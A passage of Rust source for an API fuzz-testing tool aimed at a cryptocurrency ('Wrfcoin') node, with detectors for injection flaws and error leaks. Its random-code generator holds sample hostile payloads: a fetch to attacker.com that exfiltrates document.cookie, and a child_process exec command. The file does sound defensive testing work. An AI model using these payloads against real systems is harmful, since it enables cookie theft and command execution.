        let mut rng = rand::thread_rng();
        
        let mut obj = serde_json::Map::new();
        
        // Add some fields
        let field_count = rng.gen_range(1..5);
        for _ in 0..field_count {
            let field_type = rng.gen_range(0..5);
            
            let field_name = match field_type {
                0 => "name",
                1 => "description",
                2 => "version",
                3 => "author",
                _ => "attributes",
            };
            
            let field_value = match field_type {
                0 | 1 | 3 => Value::String(Self::random_text().as_str().unwrap_or("").to_string()),
                2 => Value::String(format!("{}.{}.{}", rng.gen_range(0..10), rng.gen_range(0..10), rng.gen_range(0..10))),
                _ => {
                    let mut attrs = serde_json::Map::new();
                    for i in 0..rng.gen_range(1..3) {
                        attrs.insert(
                            format!("attr{}", i),
                            Value::String(format!("value{}", i)),
                        );
                    }
                    Value::Object(attrs)
                }
            };
            
            obj.insert(field_name.to_string(), field_value);
        }
        
        Value::Object(obj)
    }
    
    /// Generate random difficulty
    fn random_difficulty() -> Value {
        let mut rng = rand::thread_rng();
        
        let difficulty_type = rng.gen_range(0..5);
        
        match difficulty_type {
            0 => Value::Number(serde_json::Number::from(0)), // Zero
            1 => {
                // Negative (invalid)
                let neg = -rng.gen_range(0.1..10.0);
                if let Some(n) = serde_json::Number::from_f64(neg) {
                    Value::Number(n)
                } else {
                    Value::Number(serde_json::Number::from(-1))
                }
            }
            2 => {
                // Very high
                let high = rng.gen_range(1000.0..100000.0);
                if let Some(n) = serde_json::Number::from_f64(high) {
                    Value::Number(n)
                } else {
                    Value::Number(serde_json::Number::from(1000))
                }
            }
            _ => {
                // Normal
                let normal = rng.gen_range(1.0..10.0);
                if let Some(n) = serde_json::Number::from_f64(normal) {
                    Value::Number(n)
                } else {
                    Value::Number(serde_json::Number::from(1))
                }
            }
        }
    }
    
    /// Generate random code
    fn random_code() -> Value {
        let mut rng = rand::thread_rng();
        
        let code_type = rng.gen_range(0..5);
        
        match code_type {
            0 => {
                // Empty
                Value::String("".to_string())
            }
            1 => {
                // JavaScript
                let js_code = r#"
                function compute(input) {
                    let result = 0;
                    for (let i = 0; i < input.length; i++) {
                        result += input[i];
                    }
                    return result;
                }
                "#;
                Value::String(js_code.to_string())
            }
            2 => {
                // Python
                let py_code = r#"
                def compute(input):
                    result = 0
                    for i in input:
                        result += i
                    return result
                "#;
                Value::String(py_code.to_string())
            }
            3 => {
                // Potentially malicious code
                let malicious_code = match rng.gen_range(0..3) {
                    0 => r#"while(1) { }"#, // Infinite loop
                    1 => r#"require('child_process').exec('ls /')"#, // Command execution
                    _ => r#"fetch('http://attacker.com/steal?data='+document.cookie)"#, // Data exfiltration
                };
                Value::String(malicious_code.to_string())
            }
            _ => {
                // WebAssembly code (binary represented as base64)
                let wasm_code = "AGFzbQEAAAABBwFgAn9/AX8DAgEABQMBAAEHCQEFc3VtbWVyAAAPCGRlY29kZXJzAQAAAAoHAQUAIAAgAWoL";
                Value::String(wasm_code.to_string())
            }
        }
    }
    
    /// Send a fuzz request
    async fn send_fuzz_request(
        client: &Client,
        api_url: &str,
        endpoint: &str,
        method: HttpMethod,
        payload: Option<&Value>,
    ) -> Result<reqwest::Response, reqwest::Error> {
        let url = format!("{}{}", api_url, endpoint);
        
        let mut request = match method {
            HttpMethod::Get => client.get(&url),
            HttpMethod::Post => client.post(&url),
            HttpMethod::Put => client.put(&url),
            HttpMethod::Delete => client.delete(&url),
            HttpMethod::Patch => client.patch(&url),
        };
        
        // Add payload if there is one
        if let Some(payload_value) = payload {
            request = request.json(payload_value);
        }
        
        // Send the request
        request.send().await
    }
    
    /// Process a test result
    async fn process_result(
        result: Result<reqwest::Response, reqwest::Error>,
        endpoint: &str,
        method: HttpMethod,
        payload: Option<&Value>,
        results: Arc<Mutex<FuzzTestResults>>, 
        discovered_endpoints: Arc<Mutex<HashSet<String>>>,
    ) -> Option<FuzzIssue> {
        let mut results_lock = results.lock().await;
        results_lock.total_requests += 1;
        
        match result {
            Ok(response) => {
                // Success - record information
                let status = response.status();
                let status_code = status.as_u16();
                
                // Update status code counts
                *results_lock.status_codes.entry(status_code).or_insert(0) += 1;
                
                if status.is_success() {
                    results_lock.successful_requests += 1;
                    
                    // Extract response text
                    let response_text = match response.text().await {
                        Ok(text) => text,
                        Err(_) => "Failed to extract response text".to_string(),
                    };
                    
                    // Look for additional endpoints in the response
                    Self::extract_endpoints_from_text(&response_text, &mut discovered_endpoints.lock().await);
                    
                    // Check for unexpected success
                    let issue = Self::check_for_unexpected_success(endpoint, method, payload, status_code, &response_text);
                    issue
                } else if status.is_server_error() {
                    results_lock.failed_requests += 1;
                    results_lock.crashed_endpoints += 1;
                    
                    // Extract response text
                    let response_text = match response.text().await {
                        Ok(text) => text,
                        Err(_) => "Failed to extract response text".to_string(),
                    };
                    
                    // Server error - check for crash
                    let issue = Self::create_crash_issue(endpoint, method, payload, status_code, &response_text);
                    Some(issue)
                } else {
                    results_lock.failed_requests += 1;
                    
                    // Extract response text
                    let response_text = match response.text().await {
                        Ok(text) => text,
                        Err(_) => "Failed to extract response text".to_string(),
                    };
                    
                    // Client error - this is expected for fuzz testing
                    // But we might look for interesting error cases
                    let issue = Self::check_for_interesting_error(endpoint, method, payload, status_code, &response_text);
                    issue
                }
            }
            Err(err) => {
                results_lock.failed_requests += 1;
                
                // Check if it's a timeout
                let is_timeout = err.is_timeout();
                
                // Create issue for connection issues
                let issue = Self::create_connection_issue(endpoint, method, payload, is_timeout, &err.to_string());
                Some(issue)
            }
        }
    }
    
    /// Check for unexpected success
    fn check_for_unexpected_success(
        endpoint: &str,
        method: HttpMethod,
        payload: Option<&Value>,
        status_code: u16,
        response_text: &str,
    ) -> Option<FuzzIssue> {
        // Check if we have a payload
        if let Some(payload_value) = payload {
            // Look for potentially dangerous payloads that shouldn't have succeeded
            if let Some(payload_str) = payload_value.as_str() {
                // Check for SQL injection attempts that might have succeeded
                if payload_str.contains("1=1") || 
                   payload_str.contains("DROP TABLE") || 
                   payload_str.contains("--") {
                    return Some(FuzzIssue {
                        id: format!("SQL_INJECTION_{}", uuid::Uuid::new_v4()),
                        title: "Potential SQL Injection vulnerability".to_string(),
                        description: "A payload containing SQL patterns was accepted without error".to_string(),
                        severity: FuzzIssueSeverity::High,
                        method: method.as_str().to_string(),
                        endpoint: endpoint.to_string(),
                        status_code,
                        request_payload: payload.cloned(),
                        response_excerpt: response_text.chars().take(500).collect(),
                        false_positive: false,
                    });
                }
                
                // Check for command injection attempts
                if payload_str.contains("exec") || 
                   payload_str.contains(";") && payload_str.contains("ls") || 
                   payload_str.contains("cat") && payload_str.contains("/") {
                    return Some(FuzzIssue {
                        id: format!("CMD_INJECTION_{}", uuid::Uuid::new_v4()),
                        title: "Potential Command Injection vulnerability".to_string(),
                        description: "A payload containing command patterns was accepted without error".to_string(),
                        severity: FuzzIssueSeverity::Critical,
                        method: method.as_str().to_string(),
                        endpoint: endpoint.to_string(),
                        status_code,
                        request_payload: payload.cloned(),
                        response_excerpt: response_text.chars().take(500).collect(),
                        false_positive: false,
                    });
                }
            } else if let Some(obj) = payload_value.as_object() {
                // Check for object with negative amounts
                if let Some(amount) = obj.get("amount").and_then(|a| a.as_f64()) {
                    if amount < 0.0 {
                        return Some(FuzzIssue {
                            id: format!("NEGATIVE_AMOUNT_{}", uuid::Uuid::new_v4()),
                            title: "Negative amount accepted".to_string(),
                            description: "A transaction with a negative amount was accepted without error".to_string(),
                            severity: FuzzIssueSeverity::High,
                            method: method.as_str().to_string(),
                            endpoint: endpoint.to_string(),
                            status_code,
                            request_payload: payload.cloned(),
                            response_excerpt: response_text.chars().take(500).collect(),
                            false_positive: false,
                        });
                    }
                }
                
                // Check for prototype pollution attempts
                if obj.contains_key("__proto__") || 
                   obj.contains_key("constructor") || 
                   obj.contains_key("prototype") {
                    return Some(FuzzIssue {
                        id: format!("PROTOTYPE_POLLUTION_{}", uuid::Uuid::new_v4()),
                        title: "Potential Prototype Pollution vulnerability".to_string(),
                        description: "A payload containing prototype properties was accepted without error".to_string(),
                        severity: FuzzIssueSeverity::Medium,
                        method: method.as_str().to_string(),
                        endpoint: endpoint.to_string(),
                        status_code,
                        request_payload: payload.cloned(),
                        response_excerpt: response_text.chars().take(500).collect(),
                        false_positive: false,
                    });
                }
                
                // Check for NoSQL injection attempts
                if obj.contains_key("$where") || 
                   obj.contains_key("$regex") || 
                   obj.contains_key("$ne") {
                    return Some(FuzzIssue {
                        id: format!("NOSQL_INJECTION_{}", uuid::Uuid::new_v4()),
                        title: "Potential NoSQL Injection vulnerability".to_string(),
                        description: "A payload containing NoSQL operators was accepted without error".to_string(),
                        severity: FuzzIssueSeverity::High,
                        method: method.as_str().to_string(),
                        endpoint: endpoint.to_string(),
                        status_code,
                        request_payload: payload.cloned(),
                        response_excerpt: response_text.chars().take(500).collect(),
                        false_positive: false,
                    });
                }
            }
        }
        
        None
    }
    
    /// Check for interesting error responses
    fn check_for_interesting_error(
        endpoint: &str,
        method: HttpMethod,
        payload: Option<&Value>,
        status_code: u16,
        response_text: &str,
    ) -> Option<FuzzIssue> {
        // Check for error responses that might reveal sensitive information
        
        // Look for stack traces
        if response_text.contains("at ") && 
           (response_text.contains(".js:") || 
            response_text.contains(".rs:") || 
            response_text.contains("line") && response_text.contains("column")) {
            return Some(FuzzIssue {
                id: format!("STACK_TRACE_{}", uuid::Uuid::new_v4()),
                title: "Stack trace exposure".to_string(),
                description: "The endpoint returned an error with a stack trace, which could reveal implementation details".to_string(),
                severity: FuzzIssueSeverity::Medium,
                method: method.as_str().to_string(),
                endpoint: endpoint.to_string(),
                status_code,
                request_payload: payload.cloned(),
                response_excerpt: response_text.chars().take(500).collect(),
                false_positive: false,
            });
        }
        
        // Look for database errors
        if response_text.contains("SQL syntax") || 
           response_text.contains("ORA-") || 
           response_text.contains("SQLSTATE") || 
           response_text.contains("database error") {
            return Some(FuzzIssue {
                id: format!("DB_ERROR_{}", uuid::Uuid::new_v4()),
                title: "Database error exposure".to_string(),
                description: "The endpoint returned a database error message, which could reveal database schema details".to_string(),
                severity: FuzzIssueSeverity::Medium,
                method: method.as_str().to_string(),
                endpoint: endpoint.to_string(),
                status_code,
                request_payload: payload.cloned(),
                response_excerpt: response_text.chars().take(500).collect(),
                false_positive: false,
            });
        }
        
        // Look for file paths
        if (response_text.contains("/") || response_text.contains("\\")) && 
           (response_text.contains(".rs") || 
            response_text.contains(".js") || 
            response_text.contains(".json") || 
            response_text.contains(".toml") || 
            response_text.contains(".yaml")) {
            return Some(FuzzIssue {
                id: format!("FILE_PATH_{}", uuid::Uuid::new_v4()),
                title: "File path exposure".to_string(),
                description: "The endpoint returned an error with file paths, which could reveal system structure".to_string(),
                severity: FuzzIssueSeverity::Low,
                method: method.as_str().to_string(),
                endpoint: endpoint.to_string(),
                status_code,
                request_payload: payload.cloned(),
                response_excerpt: response_text.chars().take(500).collect(),
                false_positive: false,
            });
        }
        
        None
    }
    
    /// Create an issue for a server crash/error
    fn create_crash_issue(
        endpoint: &str,
        method: HttpMethod,
        payload: Option<&Value>,
        status_code: u16,
        response_text: &str,
    ) -> FuzzIssue {
        FuzzIssue {
            id: format!("SERVER_ERROR_{}", uuid::Uuid::new_v4()),
            title: format!("Server error on {}", endpoint),
            description: format!("The {} request to {} resulted in a {} server error", 
                method.as_str(), endpoint, status_code),
            severity: FuzzIssueSeverity::High,
            method: method.as_str().to_string(),
            endpoint: endpoint.to_string(),
            status_code,
            request_payload: payload.cloned(),
            response_excerpt: response_text.chars().take(500).collect(),
            false_positive: false,
        }
    }
    
    /// Create an issue for connection problems
    fn create_connection_issue(
        endpoint: &str,
        method: HttpMethod,
        payload: Option<&Value>,
        is_timeout: bool,
        error_message: &str,
    ) -> FuzzIssue {
        let title = if is_timeout {
            format!("Request timeout on {}", endpoint)
        } else {
            format!("Connection error on {}", endpoint)
        };
        
        let description = if is_timeout {
            format!("The {} request to {} timed out", method.as_str(), endpoint)
        } else {
            format!("Connection error when making {} request to {}: {}", 
                method.as_str(), endpoint, error_message)
        };
        
        let severity = if is_timeout {
            FuzzIssueSeverity::Medium
        } else {
            FuzzIssueSeverity::Low
        };
        
        FuzzIssue {
            id: if is_timeout {
                format!("TIMEOUT_{}", uuid::Uuid::new_v4())
            } else {
                format!("CONNECTION_ERROR_{}", uuid::Uuid::new_v4())
            },
            title,
            description,
            severity,
            method: method.as_str().to_string(),
            endpoint: endpoint.to_string(),
            status_code: 0, // No status code for connection errors
            request_payload: payload.cloned(),
            response_excerpt: error_message.to_string(),
            false_positive: false,
        }
    }
    
    /// Deduplicate issues
    fn deduplicate_issues(issues: &mut Vec<FuzzIssue>) {
        let mut unique_issues = Vec::new();
        let mut seen_signatures = HashSet::new();
        
        for issue in issues.drain(..) {
            // Create a signature for the issue based on its key properties
            let signature = format!("{}:{}:{}", issue.endpoint, issue.method, issue.title);
            
            if !seen_signatures.contains(&signature) {
                seen_signatures.insert(signature);
                unique_issues.push(issue);
            }
        }
        
        *issues = unique_issues;
    }
    
    /// Generate a report
    fn generate_report(&self, results: &FuzzTestResults) -> String {
        let mut report = String::new();
        
        report.push_str("======= WRFCOIN FUZZ TEST REPORT =======\n\n");
        
        // Test information
        report.push_str(&format!("Test Start: {}\n", results.start_time));
        report.push_str(&format!("Test End: {}\n", results.end_time));
        report.push_str(&format!("Duration: {:.2} seconds\n", results.duration_seconds));
        report.push_str(&format!("Target: {}\n", results.config.api_url));
        report.push_str(&format!("Iterations: {}\n", results.config.iterations));
        report.push_str(&format!("Endpoints Tested: {}\n", results.endpoints_tested.len()));
        report.push_str(&format!("Total Requests: {}\n", results.total_requests));
        report.push_str(&format!("Successful Requests: {}\n", results.successful_requests));
        report.push_str(&format!("Failed Requests: {}\n", results.failed_requests));
        report.push_str(&format!("Server Errors: {}\n\n", results.crashed_endpoints));
        
        // Status code summary
        report.push_str("STATUS CODE SUMMARY:\n");
        let mut status_codes: Vec<_> = results.status_codes.iter().collect();
        status_codes.sort_by_key(|&(code, _)| *code);
        
        for (code, count) in status_codes {
            report.push_str(&format!("  {}: {}\n", code, count));
        }
        report.push_str("\n");
        
        // Issues summary
        if !results.issues.is_empty() {
            report.push_str(&format!("FOUND {} ISSUES:\n\n", results.issues.len()));
            
            // Group issues by severity
            let mut by_severity = HashMap::new();
            for issue in &results.issues {
                by_severity.entry(issue.severity).or_insert_with(Vec::new).push(issue);
            }
            
            // Report issues by severity (highest first)
            for severity in [
                FuzzIssueSeverity::Critical,
                FuzzIssueSeverity::High,
                FuzzIssueSeverity::Medium,
                FuzzIssueSeverity::Low,
                FuzzIssueSeverity::Info,
            ] {
                if let Some(issues) = by_severity.get(&severity) {
                    report.push_str(&format!("{} {} SEVERITY ISSUES:\n", issues.len(), severity));
                    
                    for (i, issue) in issues.iter().enumerate() {
                        report.push_str(&format!("{}. {} [{}]\n", i+1, issue.title, issue.method));
                        report.push_str(&format!("   Endpoint: {}\n", issue.endpoint));
                        report.push_str(&format!("   Status: {}\n", issue.status_code));
                        report.push_str(&format!("   Description: {}\n", issue.description));
                        
                        if let Some(payload) = &issue.request_payload {
                            let payload_str = serde_json::to_string_pretty(payload).unwrap_or_else(|_| "Failed to format payload".to_string());
                            if payload_str.len() > 500 {
                                report.push_str(&format!("   Payload: {}... (truncated)\n", &payload_str[..500]));
                            } else {
                                report.push_str(&format!("   Payload: {}\n", payload_str));
                            }
                        }
                        
                        report.push_str(&format!("   Response: {}\n\n", issue.response_excerpt));
                    }
                }
            }
        } else {
            report.push_str("NO ISSUES FOUND\n\n");
        }
        
        report.push_str("============= END OF REPORT =============\n");
        
        report
    }
}

/// Run a fuzz test against a Wrfcoin node
pub async fn run_fuzz_test(
    api_url: &str,
    iterations: usize,
    safe_only: bool,
) -> Result<()> {
    info!("Starting fuzz test against {}", api_url);
    
    let config = FuzzTestConfig {
        api_url: api_url.to_string(),
        iterations,
        max_concurrent_requests: 10,
        request_timeout_seconds: 10,
        safe_endpoints_only: safe_only,
        included_endpoints: Vec::new(),
        excluded_endpoints: vec!["/shutdown".to_string(), "/reset".to_string()],
        max_payload_size: 10240,
        include_binary_data: false,
        random_seed: None,
    };
    
    let mut runner = FuzzTestRunner::new(config);
    runner.run().await?;
    
    info!("Fuzz test completed");
    
    Ok(())
}

/// Run a targeted fuzz test against specific endpoints
pub async fn run_targeted_fuzz_test(
    api_url: &str,
    endpoints: Vec<String>,
    iterations: usize,
    safe_only: bool,
) -> Result<()> {
    info!("Starting targeted fuzz test against {}", api_url);
    info!("Targeting endpoints: {:?}", endpoints);
    
    let config = FuzzTestConfig {
        api_url: api_url.to_string(),
        iterations,
        max_concurrent_requests: 10,
        request_timeout_seconds: 10,
        safe_endpoints_only: safe_only,
        included_endpoints: endpoints,
        excluded_endpoints: vec!["/shutdown".to_string(), "/reset".to_string()],
        max_payload_size: 10240,
        include_binary_data: false,
        random_seed: None,
    };
    
    let mut runner = FuzzTestRunner::new(config);
    runner.run().await?;
    
    info!("Targeted fuzz test completed");
    
    Ok(())
}